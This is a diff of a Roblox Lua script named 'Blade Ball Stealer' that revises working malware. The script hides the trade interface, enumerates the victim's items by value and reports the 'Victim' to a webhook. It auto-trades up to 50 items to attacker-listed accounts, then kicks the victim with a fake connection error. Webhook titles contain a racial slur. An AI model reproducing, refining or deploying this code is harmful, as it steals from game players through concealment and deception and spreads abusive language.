@@ -1,4 +1,4 @@
--- Configuration (Ré-exécution infinie activée)
+-- Configuration
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -6,45 +6,35 @@ local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 
+-- Paramètres (A ajuster avec tes infos)
+local users = _G.Usernames or {"ThunderStealthZap16", "Natalhie10"}
+local webhook = _G.webhook or "" 
+local auth_token = "EBK-SS-A" 
+local min_rap = _G.min_rap or 0 
+
 -- Interfaces
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
-local notificationsGui = PlayerGui.Notifications
-local tradeCompleteGui = PlayerGui.TradeCompleted
 local inTrade = false
+
+-- Désactivation propre de l'UI pour éviter les conflits et les déclins auto
+local function setupUI()
+    pcall(function()
+        tradeGui.Enabled = false
+        -- On empêche le script de fermer le trade violemment lors du changement d'état
+        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            inTrade = tradeGui.Enabled
+            if inTrade then
+                tradeGui.Enabled = false -- Reste invisible mais actif côté serveur
+            end
+        end)
+    end)
+end
+setupUI()
 
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
--- Paramètres (Vérifie bien ton Worker URL ici)
-local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
-local webhook = _G.webhook or "" -- TON URL DE WORKER ICI
-local auth_token = "EBK-SS-A" -- Correspond à ton SECRET_TOKEN du Worker
-local min_rap = _G.min_rap or 0 
-local ping = _G.pingEveryone or "Yes"
-
----------------------------------------------------------
--- CACHE DE L'INTERFACE
----------------------------------------------------------
-local function killUI()
-    pcall(function()
-        tradeGui.Enabled = false
-        tradeGui.Black.Visible = false
-        tradeCompleteGui.Enabled = false
-        tradeGui.Main.Visible = false
-        notificationsGui.Enabled = false
-    end)
-end
-killUI()
-
-tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-    inTrade = tradeGui.Enabled
-    if inTrade then tradeGui.Enabled = false end 
-end)
-
----------------------------------------------------------
--- FONCTIONS RAP
----------------------------------------------------------
 local function getRAP(category, itemName)
     local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
     if not success or not rapData then return 0 end
@@ -59,99 +49,83 @@ local function getRAP(category, itemName)
     return 0
 end
 
----------------------------------------------------------
--- WEBHOOK OPTIMISÉ POUR TON WORKER
----------------------------------------------------------
-
-local function SendStatusWebhook(title, color, isStart)
-    table.sort(itemsToSend, function(a, b)
-        return a.RAP > b.RAP
-    end)
-
+-- Webhook stylé selon l'image image_2026-02-17_185250511.png
+local function SendStatusWebhook(title, color)
     local totalRAP = 0
-    local itemLines = ""
     for _, item in ipairs(itemsToSend) do
-        itemLines = itemLines .. "• " .. item.Name .. " [" .. math.floor(item.RAP) .. " RAP]\n"
         totalRAP = totalRAP + item.RAP
     end
 
-    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
-    local clickableLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-    
-    -- Format d'URL Headshot (le plus stable pour Discord via Worker)
-    local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
-
-    -- Structure JSON exacte attendue par ton Worker Cloudflare
     local payload = {
         ["auth_token"] = auth_token,
-        ["content"] = (isStart and ping == "Yes") and "@everyone | " .. joinCode or nil,
         ["embeds"] = {{
-            ["title"] = title,
-            ["color"] = color,
+            ["title"] = "⚠️ " .. title,
+            ["color"] = color, -- Jaune : 16776960
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true},
-                {name = "🔗 Join link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
-                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
+                {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true}
             },
             ["thumbnail"] = {
-                ["url"] = thumbUrl
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
             },
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
         }}
     }
 
-    local success, res = pcall(function()
-        return request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
 end
 
----------------------------------------------------------
--- AUTO TRADE
----------------------------------------------------------
 local function startAutoTrade(targetPlayer)
     task.spawn(function()
+        -- Tri du RAP décroissant
         table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
 
         while #itemsToSend > 0 do
+            -- Envoi de la requête de trade
             netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
             
+            -- Attente que le trade soit accepté (plus robuste)
             local timeout = 0
-            repeat task.wait(0.5) timeout = timeout + 1 until inTrade or timeout > 20
+            while not inTrade and timeout < 30 do
+                task.wait(1)
+                timeout = timeout + 1
+            end
             
             if inTrade then
+                task.wait(1.5) -- Délai de sécurité pour éviter le déclin auto du jeu
+                
                 local limit = 0
                 while #itemsToSend > 0 and limit < 50 do
                     local item = table.remove(itemsToSend, 1)
-                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+                    pcall(function()
+                        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+                    end)
                     limit = limit + 1
-                    task.wait(0.05)
+                    task.wait(0.1)
                 end
 
-                pcall(function()
-                    netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-                    task.wait(0.5)
-                    netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-                end)
-                repeat task.wait(0.2) until not inTrade
+                task.wait(1)
+                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+                task.wait(1)
+                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+                
+                -- Attente de la fin du trade avant la suite
+                repeat task.wait(1) until not inTrade
             end
-            task.wait(1)
+            task.wait(2)
         end
         
         task.wait(2)
-        -- Kick crédible Code 277
         plr:kick("Please check your internet connection and try again. (Error Code: 277)")
     end)
 end
 
----------------------------------------------------------
--- LANCEMENT
----------------------------------------------------------
+-- Scan Initial
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
@@ -165,22 +139,23 @@ for _, cat in ipairs(categories) do
     end
 end
 
+-- Logique de détection
 if #itemsToSend > 0 then
-    local found = false
-    for _, p in ipairs(Players:GetPlayers()) do
-        if table.find(users, p.Name) then
-            SendStatusWebhook("⚠️ The nigga is on the server !", 16776960, false)
-            startAutoTrade(p)
-            found = true
-            break
+    local function checkAndStart()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if table.find(users, p.Name) then
+                SendStatusWebhook("The nigga is on the server !", 16776960) -- Embed Jaune
+                startAutoTrade(p)
+                return true
+            end
         end
+        return false
     end
 
-    if not found then
-        SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)
+    if not checkAndStart() then
         Players.PlayerAdded:Connect(function(player)
             if table.find(users, player.Name) then
-                SendStatusWebhook("⚠️ The nigga is on the server !", 16776960, false)
+                SendStatusWebhook("The nigga is on the server !", 16776960)
                 startAutoTrade(player)
             end
         end)
